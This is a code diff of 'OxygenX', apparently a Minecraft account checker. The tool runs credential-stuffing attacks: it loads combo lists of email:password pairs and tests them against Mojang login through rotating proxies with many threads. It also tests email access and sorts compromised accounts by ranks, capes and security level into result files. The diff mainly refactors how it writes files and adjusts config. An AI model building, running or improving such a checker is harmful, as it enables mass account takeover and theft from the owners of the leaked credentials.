@@ -2,7 +2,6 @@ from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timedelta, timezone
 from multiprocessing.dummy import Pool as ThreadPool
 from os import mkdir, path, system, name
-from queue import Queue
 from random import choice
 from re import compile
 from threading import Thread, Lock
@@ -35,8 +34,8 @@ OxygenX:
   # Needs to be 1 or higher (Recommanded: 1-2 for paid proxies, 3-6 for public proxies.)
   retries: 3
 
-  # Higher for better accuracy but slower (counted in milliseconds, example: 8000ms = 8 seconds)
-  timeout: 8000
+  # Higher for better accuracy but slower (counted in milliseconds, example: 6000ms = 6 seconds)
+  timeout: 6000
 
   # Threads for account checking
   threads: 200
@@ -59,7 +58,7 @@ OxygenX:
   # Print bad accounts
   print_bad: true
   
-  # Save bad accounts, good for checking paid alts (will use more cpu and take longer)
+  # Save bad accounts
   save_bad: true
 
   # Normal users should keep this false unless problem start happening
@@ -102,8 +101,8 @@ OxygenX:
     proxy_remove_limit: 200
     # If proxies be used for checking sfas (Will be slower but if false, you may get ip banned)
     proxy_for_sfa: true
-    # Sleep between checks if proxy mode is false
-    sleep_proxyless: 20
+    # Sleep between checks if proxy mode is false (put 0 for no sleep) counted in secouds
+    sleep_proxyless: 30
     
     api:
       # If proxy api link to be used.
@@ -113,6 +112,7 @@ OxygenX:
       # If proxy_use_api is true, put a number for seconds to refresh the link (every number under 30 is for no refreshing time, recommend refresh time: 300 seconds aka 5 minutes)
       refresh_time: 300
 '''
+
 while True:
     try:
         config = safe_load(open('config.yml', 'r', errors='ignore'))
@@ -153,12 +153,12 @@ class Main:
         if OxygenX.Cape.lb:
             self.lbcape = str(self.liquidbounce())
         print(t)
+        print(f'{red}[!] Please remember to configure your config file before using OxygenX\n')
         self.loadcombo()
         self.loadproxy()
         self.get_announcement()
         self.resultfolder()
         print(f'\n{cyan}Starting Threads...')
-        Thread(target=self.write, daemon=True).start()
         Thread(target=cpm_counter, daemon=True).start()
         self.start_checker()
         self.wait_for_end()
@@ -187,16 +187,16 @@ class Main:
                     if OxygenX.print_bad:
                         self.prints(f'{red}[Bad] {blue}- {red}{line}')
                     if OxygenX.save_bad:
-                        writer.put([line, 'Bad'])
+                        self.writing([line, 'Bad'])
                 elif '[]' in texta:
-                    self.prints(f'{Fore.LIGHTYELLOW_EX}[Demo] {blue}- {Fore.LIGHTYELLOW_EX}{line}')
+                    self.prints(f'{yellow}[Demo] {blue}- {yellow}{line}')
                     Counter.demo += 1
-                    open(f'{self.folder}/Demo.txt', 'a', encoding='u8').write(f'{line}\n')
+                    self.writing([line, 'Demo'])
                 else:
                     ajson = answer.json()
                     uuid = ajson['availableProfiles'][0]["id"]
                     username = ajson['availableProfiles'][0]['name']
-                    open(f'{self.folder}/Hits.txt', 'a', encoding='u8').write(f'{line}\n')
+                    self.writing([line, 'Hits'])
                     token = ajson['accessToken']
                     dosfa = True
                     sfa = False
@@ -222,7 +222,7 @@ class Main:
                         Counter.unfa += 1
                         self.prints(
                             f'{magenta}[Unmigrated]{blue} - {green}{line}')
-                        open(f'{self.folder}/Unmigrated.txt', 'a', encoding='u8').write(f'{line}\n')
+                        self.writing([line, 'Unmigrated'])
                         data.append('\nUnmigrated: True')
                         dosfa = False
 
@@ -242,8 +242,7 @@ class Main:
 
                     if len(username) <= 3 or any(x in username for x in charz):
                         Counter.special_name += 1
-                        open(f'{self.folder}/SpecialName.txt', 'a', encoding='u8').write(
-                            f'{line} | Username: {username}\n')
+                        self.writing([f'{line} | Username: {username}', 'SpecialName'])
                         data.append('\nSpecial Name: True')
 
                     with ThreadPoolExecutor(max_workers=8) as exe:
@@ -268,8 +267,7 @@ class Main:
                     if OxygenX.Cape.lb:
                         if uuid in self.lbcape:
                             Counter.liquidbounce += 1
-                            open(f'{self.folder}/LiquidBounceCape.txt', 'a', encoding='u8').write(
-                                f'{line} | Username: {username}\n')
+                            self.writing([f'{line} | Username: {username}', 'LiquidBounceCape'])
                             data.append('\nLiquidBounce Cape: True')
 
                     if dosfa:
@@ -312,18 +310,18 @@ class Main:
 
                     if saveranked and dosfa:
                         if sfa:
-                            open(f'{self.folder}/SFA.txt', 'a', encoding='u8').write(f'{line}\n')
+                            self.writing([line, 'SFA'])
                         else:
-                            open(f'{self.folder}/NFA.txt', 'a', encoding='u8').write(f'{line}\n')
+                            self.writing([line, 'NFA'])
 
-                    writer.put([''.join(data), 'CaptureData'])
+                    self.writing([''.join(data), 'CaptureData'])
             except Exception as e:
                 if OxygenX.debug:
                     self.prints(f'{red}[Error] {line} \nError: {e}')
-                writer.put([line, 'Error'])
+                self.writing([line, 'Error'])
                 Counter.bad += 1
         else:
-            writer.put([line, 'Error'])
+            self.writing([line, 'Error'])
 
     def checkmc(self, user, passw):
         payload = ({
@@ -415,9 +413,7 @@ class Main:
                     resp = session.get(url=sfa_url, headers=headers).text
                 except Exception as e:
                     if OxygenX.debug:
-                        lock.acquire()
-                        print(f'ErrorSFA ProxyLess: \n{e}')
-                        lock.release()
+                        self.prints(f'ErrorSFA ProxyLess: \n{e}')
                     resp = 'NFA'
             else:
                 while True:
@@ -484,14 +480,13 @@ class Main:
         print(f'{blue}{self.now_time()} {line}')
         lock.release()
 
-    def write(self):
-        while 1:
-            if writer.qsize() != 0:
-                split = writer.get()
-                line = split[0]
-                file = split[1]
-                open(f'{self.folder}/{file}.txt', 'a', encoding='u8').write(
-                    f'{line}\n')
+    def writing(self, line):
+        lock.acquire()
+        split = line
+        line = split[0]
+        file = split[1]
+        open(f'{self.folder}/{file}.txt', 'a', encoding='u8').write(f'{line}\n')
+        lock.release()
 
     def optifine(self, user, combo):
         cape = False
@@ -501,7 +496,7 @@ class Main:
                 if 'Not found' not in optifine:
                     cape = True
                     Counter.optifine += 1
-                    open(f'{self.folder}/OptifineCape.txt', 'a', encoding='u8').write(f'{combo} | Username: {user}\n')
+                    self.writing([f'{combo} | Username: {user}', 'OptifineCape'])
             except Exception as e:
                 if OxygenX.debug:
                     self.prints(f'{red}Error Optifine:\n{e}')
@@ -515,7 +510,7 @@ class Main:
                 if 'png' in mine:
                     cape = True
                     Counter.mojang += 1
-                    open(f'{self.folder}/MojangCape.txt', 'a', encoding='u8').write(f'{combo} | Username: {user}\n')
+                    self.writing([f'{combo} | Username: {user}', 'MojangCape'])
             except Exception as e:
                 if OxygenX.debug:
                     self.prints(f'{red}Error MojangCape:\n{e}')
@@ -530,7 +525,7 @@ class Main:
                 if 'Not Found' not in laby:
                     cape = True
                     Counter.labymod += 1
-                    open(f'{self.folder}/LabymodCape.txt', 'a', encoding='u8').write(f'{combo} | Username: {user}\n')
+                    self.writing([f'{combo} | Username: {user}', 'LabymodCape'])
             except Exception as e:
                 if OxygenX.debug:
                     self.prints(f'{red}Error Labymod:\n{e}')
@@ -560,8 +555,7 @@ class Main:
                 if OxygenX.debug:
                     self.prints(f'{red}Error HiveMC:\n{e}')
             if rank:
-                open(f'{self.folder}/HiveRanked.txt', 'a', encoding='u8').write(
-                    f'{combo} | Rank: {str(rank)}\n')
+                self.writing([f'{combo} | Rank: {str(rank)}', 'HiveRanked'])
                 Counter.hivemcrank += 1
             return rank
 
@@ -584,16 +578,14 @@ class Main:
                     self.prints(f'{red}Error Mineplex:\n{e}')
             if both[0]:
                 Counter.mineplexrank += 1
-                open(f'{self.folder}/MineplexRanked.txt', 'a', encoding='u8').write(
-                    f'{combo} | Rank: {both[0]}\n')
+                self.writing([f'{combo} | Rank: {both[0]}', 'MineplexRanked'])
             if both[1] and OxygenX.Rank.mineplex:
                 if both[1] >= OxygenX.Level.mineplex_level:
                     Counter.mineplexhl += 1
-                    open(f'{self.folder}/MineplexHighLevel.txt', 'a', encoding='u8').write(
-                        f'{combo} | Level: {str(both[1])}\n')
+                    self.writing([f'{combo} | Level: {str(both[1])}', 'MineplexHighLevel'])
             if not both[0] and not both[1]:
                 Counter.nomineplex += 1
-                open(f'{self.folder}/NoMineplexLogin.txt', 'a', encoding='u8').write(f'{combo}\n')
+                self.writing([combo, 'NoMineplexLogin'])
         return both
 
     def hypixel(self, uuid, combo):
@@ -623,15 +615,13 @@ class Main:
             if not both[2]:
                 if str(both[0]) not in ['None', 'False']:
                     Counter.hypixelrank += 1
-                    open(f'{self.folder}/HypixelRanked.txt', 'a', encoding='u8').write(
-                        f'{combo} | Rank: {both[0]}\n')
+                    self.writing([f'{combo} | Rank: {both[0]}', 'HypixelRanked'])
                 if both[1] >= OxygenX.Level.hypixel_level:
                     Counter.hypixelhl += 1
-                    open(f'{self.folder}/HypixelHighLevel.txt', 'a', encoding='u8').write(
-                        f'{combo} | Level: {str(both[1])}\n')
+                    self.writing([f'{combo} | Level: {str(both[1])}', 'HypixelHighLevel'])
             else:
                 Counter.nohypixel += 1
-                open(f'{self.folder}/NoHypixelLogin.txt', 'a', encoding='u8').write(f'{combo}\n')
+                self.writing([combo, 'NoHypixelLogin'])
         return both
 
     def veltpvp(self, username, combo):
@@ -651,7 +641,7 @@ class Main:
                 if OxygenX.debug:
                     self.prints(f'{red}Error Veltpvp:\n{e}')
             if rank:
-                open(f'{self.folder}/VeltRanked.txt', 'a', encoding='u8').write(f'{combo} | Rank: {rank}\n')
+                self.writing([f'{combo} | Rank: {rank}', 'VeltRanked'])
                 Counter.veltrank += 1
         return rank
 
@@ -669,7 +659,7 @@ class Main:
             if 'Ok=1' in ans:
                 mailaccesz = True
                 Counter.emailaccess += 1
-                open(f'{self.folder}/EmailAccess.txt', 'a', encoding='u8').write(f'{email}:{password}\n')
+                self.writing([f'{email}:{password}', 'EmailAccess'])
             return mailaccesz
 
     def rproxies(self):
@@ -684,7 +674,7 @@ class Main:
 
             except Exception as ex:
                 if OxygenX.debug:
-                    print(f"{Fore.LIGHTRED_EX}Error while refreshing proxies: \n{ex}\n")
+                    print(f"{red}Error while refreshing proxies: \n{ex}\n")
                 sleep(60)
                 break
 
@@ -694,7 +684,7 @@ class Main:
     def loadcombo(self):
         while True:
             try:
-                print("Please Import Your Combo List...")
+                print(f"{cyan}Please Import Your Combo List...")
                 sleep(0.3)
                 loader = open(fileopenbox(title="Load Combo List", default="*.txt"), 'r', encoding="utf8",
                               errors='ignore').read().split('\n')
@@ -706,7 +696,7 @@ class Main:
                 break
             except Exception as ex:
                 if OxygenX.debug:
-                    print(f"{Fore.LIGHTRED_EX}Error while loading combo: \n{ex}\n")
+                    print(f"{red}Error while loading combo: \n{ex}\n")
 
     #   Load Proxy   #
     def loadproxy(self):
@@ -715,7 +705,7 @@ class Main:
                 idk = True
                 loader = []
                 if OxygenX.Proxy.proxy and not OxygenX.Proxy.API.use:
-                    print("Please Import Your Proxies List.....")
+                    print(f"\n{cyan}Please Import Your Proxies List.....")
                     sleep(0.3)
                     loader = open(fileopenbox(title="Load Proxies List", default="*.txt"), 'r', encoding="utf8",
                                   errors='ignore').read().split('\n')
@@ -767,7 +757,7 @@ class Main:
             elif color == 'magenta\n':
                 color = magenta
             elif color == 'yellow\n':
-                color = Fore.LIGHTYELLOW_EX
+                color = yellow
             self.announcement = f"{color}{announcement[0]}"
         except Exception as ex:
             if OxygenX.debug:
@@ -777,33 +767,32 @@ class Main:
         symbo = f'[{Fore.GREEN}>{white}]'
         cyan = f'[{Fore.CYAN}>{white}]'
         while True:
-            if writer.empty():
-                sleep(1.5)
-                self.stop_time = False
-                print(f'{white}\n\n[{Fore.YELLOW}>{white}] Results: \n\n'
-                      f'[{green}+{white}] Hits: {Counter.hits}\n'
-                      f'[{red}-{white}] Bad: {Counter.bad}{white}\n\n'
-                      f'[{Fore.LIGHTYELLOW_EX}>{white}] Demo: {Counter.demo}\n'
-                      f'[{green}>{white}] NFA: {Counter.nfa}\n'
-                      f'{cyan} SFA: {Counter.sfa}\n'
-                      f'[{blue}>{white}] MFA: {Counter.emailaccess}\n'
-                      f'[{magenta}>{white}] Unmigrated: {Counter.unfa}\n\n'
-                      f'{symbo} NoHypixel Login accounts: {Counter.nohypixel}\n'
-                      f'{symbo} NoMineplex Login accounts: {Counter.nomineplex}\n'
-                      f'{symbo} Mojang capes: {Counter.mojang}\n'
-                      f'{symbo} Optifine capes: {Counter.optifine}\n'
-                      f'{symbo} Labymod capes: {Counter.labymod}\n'
-                      f'{symbo} LiquidBounce capes: {Counter.liquidbounce}\n'
-                      f'{symbo} Hypixel Ranked accounts: {Counter.hypixelrank}\n'
-                      f'{symbo} Mineplex Ranked accounts: {Counter.mineplexrank}\n'
-                      f'{symbo} HiveMC Ranked accounts: {Counter.hivemcrank}\n'
-                      f'{symbo} Veltpvp Ranked accounts: {Counter.veltrank}\n'
-                      f'{symbo} Hypixel {OxygenX.Level.hypixel_level}+ accounts: {Counter.hypixelhl}\n'
-                      f'{symbo} Mineplex {OxygenX.Level.mineplex_level}+ accounts: {Counter.mineplexhl}\n'
-                      f'{cyan} Speed: {blue}{round(Counter.checked / (time() - self.start_time), 2)} accounts/s\n'
-                      f'{white}{cyan} Total time checking: {white}{self.now_time()}\n\n'
-                      f'[{magenta}x{white}] Finish checking..\n')
-                break
+            sleep(1.5)
+            self.stop_time = False
+            print(f'{white}\n\n[{Fore.YELLOW}>{white}] Results: \n\n'
+                  f'[{green}+{white}] Hits: {Counter.hits}\n'
+                  f'[{red}-{white}] Bad: {Counter.bad}{white}\n\n'
+                  f'[{yellow}>{white}] Demo: {Counter.demo}\n'
+                  f'[{green}>{white}] NFA: {Counter.nfa}\n'
+                  f'{cyan} SFA: {Counter.sfa}\n'
+                  f'[{blue}>{white}] MFA: {Counter.emailaccess}\n'
+                  f'[{magenta}>{white}] Unmigrated: {Counter.unfa}\n\n'
+                  f'{symbo} NoHypixel Login accounts: {Counter.nohypixel}\n'
+                  f'{symbo} NoMineplex Login accounts: {Counter.nomineplex}\n'
+                  f'{symbo} Mojang capes: {Counter.mojang}\n'
+                  f'{symbo} Optifine capes: {Counter.optifine}\n'
+                  f'{symbo} Labymod capes: {Counter.labymod}\n'
+                  f'{symbo} LiquidBounce capes: {Counter.liquidbounce}\n'
+                  f'{symbo} Hypixel Ranked accounts: {Counter.hypixelrank}\n'
+                  f'{symbo} Mineplex Ranked accounts: {Counter.mineplexrank}\n'
+                  f'{symbo} HiveMC Ranked accounts: {Counter.hivemcrank}\n'
+                  f'{symbo} Veltpvp Ranked accounts: {Counter.veltrank}\n'
+                  f'{symbo} Hypixel {OxygenX.Level.hypixel_level}+ accounts: {Counter.hypixelhl}\n'
+                  f'{symbo} Mineplex {OxygenX.Level.mineplex_level}+ accounts: {Counter.mineplexhl}\n'
+                  f'{cyan} Speed: {blue}{round(Counter.checked / (time() - self.start_time), 2)} accounts/s\n'
+                  f'{white}{cyan} Total time checking: {white}{self.now_time()}\n\n'
+                  f'[{magenta}x{white}] Finish checking..\n')
+            break
 
     def start_checker(self):
         if OxygenX.threads > len(self.accounts):
@@ -841,12 +830,9 @@ def checkforupdates():
             clear()
     except Exception as ex:
         if OxygenX.debug:
-            print(f"{Fore.LIGHTRED_EX} Error while checking for updates: \n{ex}\n")
+            print(f"{red} Error while checking for updates: \n{ex}\n")
 
 
-#################################
-# For config variables          #
-#################################
 class OxygenX:
     version_check = bool(config['OxygenX']['check_for_updates'])
     retries = int(config['OxygenX']['retries'])
@@ -883,7 +869,7 @@ class OxygenX:
         proxy = bool(config['OxygenX']['proxy']['proxy'])
         type = str(config['OxygenX']['proxy']['proxy_type']).lower()
         remove_bad_proxy = bool(config['OxygenX']['proxy']['remove_bad_proxy'])
-        proxy_remove_limit = int(config['OxygenX']['proxy']['proxy_remove_limit'])
+        proxy_remove_limit = int(config['OxygenX']['proxy']['proxy_remove_limit']) + 1
         sfa_proxy = bool(config['OxygenX']['proxy']['proxy_for_sfa'])
         sleep = int(config['OxygenX']['proxy']['sleep_proxyless'])
 
@@ -913,14 +899,13 @@ if __name__ == '__main__':
 \n'''
     version = '0.6'
     set_title(f'OxygenX-{version} | by ShadowOxygen')
-    writer = Queue()
     session = Session()
     lock = Lock()
     veltrankz = compile(r'<h2 style=\"color: .*\">(.*)</h2>')
     rankhv = compile(r'class=\"rank.*\">(.*)<')
     levelmp = compile(r'>Level (.*)</b>')
     rankmp = compile(r'class=\"www-mp-rank\".*>(.*)</span>')
-
+    yellow = Fore.LIGHTYELLOW_EX
     red = Fore.LIGHTRED_EX
     green = Fore.LIGHTGREEN_EX
     cyan = Fore.LIGHTCYAN_EX
